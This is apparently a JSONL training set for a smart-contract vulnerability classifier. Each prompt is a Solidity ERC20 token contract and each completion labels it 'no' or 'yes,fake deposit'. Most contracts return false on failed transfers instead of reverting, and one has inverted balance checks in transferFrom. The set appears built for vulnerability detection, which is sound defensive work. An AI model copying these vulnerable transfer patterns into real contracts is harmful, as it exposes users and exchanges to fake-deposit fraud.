{"prompt": "pragma solidity >=0.4.24 <0.8.0; \n \n \n/** \n * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that \n * behind a proxy. Since a proxied contract can't have a constructor, it's common to move constructor \n * external initializer function, usually called `initialize`. It then becomes necessary to protect t\n * function so it can only be called once. The {initializer} modifier provided by this contract will \n * \n * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be call\n * possible by providing the encoded function call as the `_data` argument to {UpgradeableProxy-const\n * \n * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer \n * that all initializers are idempotent. This is not verified automatically as constructors are by So\n */ \nabstract contract Initializable { \n \n /** \n * @dev Indicates that the contract has been initialized. \n */ \n bool private _initialized; \n \n /** \n * @dev Indicates that the contract is in the process of being initialized. \n */ \n bool private _initializing; \n \n /** \n * @dev Modifier to protect an initializer function from being invoked twice. \n */ \n modifier initializer() { \n require(_initializing || _isConstructor() || !_initialized, \"Initializable: contract is alrea\n \n bool isTopLevelCall = !_initializing; \n if (isTopLevelCall) { \n _initializing = true; \n _initialized = true; \n } \n \n _; \n \n if (isTopLevelCall) { \n _initializing = false; \n } \n } \n \n /// @dev Returns true if and only if the function is running in the constructor \n function _isConstructor() private view returns (bool) { \n return !AddressUpgradeable.isContract(address(this)); \n } \n} \n \n// File: @openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol \n \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.5.0;\n\n\ninterface ERC20Interface {\n \n function totalSupply() external view returns (uint256);\n\n \n function balanceOf(address account) external view returns (uint256);\n\n \n function transfer(address recipient, uint256 amount) external returns (bool);\n\n \n function allowance(address owner, address spender) external view returns (uint256);\n\n \n function approve(address spender, uint256 amount) external returns (bool);\n\n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n \n event Transfer(address indexed from, address indexed to, uint256 value);\n\n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n // Empty internal constructor, to prevent people from mistakenly deploying\n // an instance of this contract, which should be used via inheritance.\n // constructor () internal { }\n // solhint-disable-previous-line no-empty-blocks\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract Token is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply;\n _balances[msg.sender] = initialSupply;\n }\n\n \n function name() public view returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract VERSO is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000*10**uint256(decimals);\n string public constant name = \"VERSO\";\n string public constant symbol = \"VSO\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract Nameless is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function Nameless(\n ) {\n balances[msg.sender] = 99983740000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 107975610000000000000000000; // Update total supply (100000 for example)\n name = \"Nameless\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"NXN\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "contract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n\ncontract HumanStandardToken is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H0.1'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount; // Give the creator all initial tokens\n totalSupply = _initialAmount; // Update total supply\n name = _tokenName; // Set the name for display purposes\n decimals = _decimalUnits; // Amount of decimals for display purposes\n symbol = _tokenSymbol; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.22;\n\ncontract ForeignToken {\n function balanceOf(address _owner) public constant returns (uint256);\n function transfer(address _to, uint256 _value) public returns (bool);\n}\n\ncontract EIP20Interface {\n function balanceOf(address _owner) public view returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\ncontract Owned {\n address public owner;\n address public newOwner;\n\n event OwnershipTransferred(address indexed _from, address indexed _to);\n\n constructor() public {\n owner = msg.sender;\n }\n\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n\n function transferOwnership(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n\n function acceptOwnership() public {\n require(msg.sender == newOwner);\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n newOwner = address(0);\n }\n}\n\ncontract FerrasCoin is EIP20Interface, Owned{\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalContribution = 0; // Total que han gastado en ETH\n string public symbol; // Symbolo del Token\n string public name; // Nombre del token\n uint8 public decimals; // # de decimales\n uint256 public _totalSupply = 1300000000; // Suministro m\u00e1ximo\n uint256 public tokensIssued; // Tokens expedidos\n\n modifier onlyExecuteBy(address _account)\n {\n require(msg.sender == _account);\n _;\n }\n\n\n function balanceOf(address _owner) public constant returns (uint256) {\n return balances[_owner];\n }\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (_value == 0) { return false; }\n uint256 fromBalance = balances[msg.sender];\n bool sufficientFunds = fromBalance >= _value;\n bool overflowed = balances[_to] + _value < balances[_to];\n if (sufficientFunds && !overflowed) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (_value == 0) { return false; }\n uint256 fromBalance = balances[_from];\n uint256 allowance = allowed[_from][msg.sender];\n bool sufficientFunds = fromBalance <= _value;\n bool sufficientAllowance = allowance <= _value;\n bool overflowed = balances[_to] + _value > balances[_to];\n if (sufficientFunds && sufficientAllowance && !overflowed) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public constant returns (uint256) {\n return allowed[_owner][_spender];\n }\n\n function withdrawForeignTokens(address _tokenContract) public onlyExecuteBy(owner) returns (bool) {\n ForeignToken token = ForeignToken(_tokenContract);\n uint256 amount = token.balanceOf(address(this));\n return token.transfer(owner, amount);\n }\n\n function withdraw() public onlyExecuteBy(owner) {\n owner.transfer(address(this).balance);\n }\n\n function getStats() public constant returns (uint256, uint256, uint256) {\n return (totalContribution, _totalSupply, tokensIssued);\n }\n\n\n constructor() public {\n owner = msg.sender;\n symbol = \"ZAZAZA\";\n name = \"Ferras Coin\";\n decimals = 0;\n uint256 paMi = 9999999;\n tokensIssued += paMi;\n balances[msg.sender] += paMi;\n emit Transfer(address(this), msg.sender, paMi);\n }\n\n function() payable public {\n uint rate = uint(msg.value / 100000000000000);\n if((tokensIssued + rate) <= _totalSupply){\n owner.transfer(msg.value);\n totalContribution += msg.value;\n tokensIssued += rate;\n balances[msg.sender] += rate;\n emit Transfer(address(this), msg.sender, rate);\n }else{\n revert();\n }\n \n }\n\n\n \n event LaDerrama(address indexed _burner, uint256 _value);\n\n function FerrasYaEstuvo(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] -= _value;\n _totalSupply -= _value;\n emit LaDerrama(burner, _value);\n }\n\n\n\n\n\n function getTime() internal constant returns (uint) {\n return now;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\ncontract SafeRune {\n string public name = 'Safu Rune';\n uint8 public decimals = 18;\n string public symbol = 'SafuRune';\n string public version = '1.0';\n uint256 public totalSupply = 0;\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n Erc20Rune erc20RuneContract = Erc20Rune(0x3155BA85D5F96b2d030a4966AF206230e46849cb);\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function approve(address _spender, uint256 _value ) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function RedeemErc20Rune(uint256 _value) public {\n if (balances[msg.sender] >= _value && _value > 0) {\n if(!erc20RuneContract.transfer(msg.sender, _value)) revert();\n balances[msg.sender] -= _value;\n totalSupply -= _value;\n emit Transfer(msg.sender, address(this), _value);\n } else { revert(); }\n }\n\n function MintSafeRune(uint256 _value) public {\n // transferTo always returns true so theres no reason to check the return value. Reverts on fail\n erc20RuneContract.transferTo(address(this), _value);\n balances[msg.sender] += _value;\n totalSupply += _value;\n emit Transfer(address(this), msg.sender, _value);\n }\n}\n\ninterface Erc20Rune {\n function transferTo(address recipient, uint256 amount) external returns (bool);\n function transfer(address _to, uint256 _value) external returns (bool success);\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'EthereumDoughnut' token contract\n//\n// Symbol : ENUT \ud83c\udf69\n// Name : Ethereum Doughnut\n// Total supply: 100000000000000\n// Decimals : 18\n//\n// TOTAL SUPPLY 1,000,000,000,000,000\n// 50% Burned\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract EthereumDoughnut is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Ethereum Doughnut\";\n string public constant symbol = \"ENUT \ud83c\udf69\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000000000; // Update total supply (100000 for example)\n name = \"Molchem\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals\n symbol = \"CHEM\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n/// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n/// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n/// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\nfunction transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return 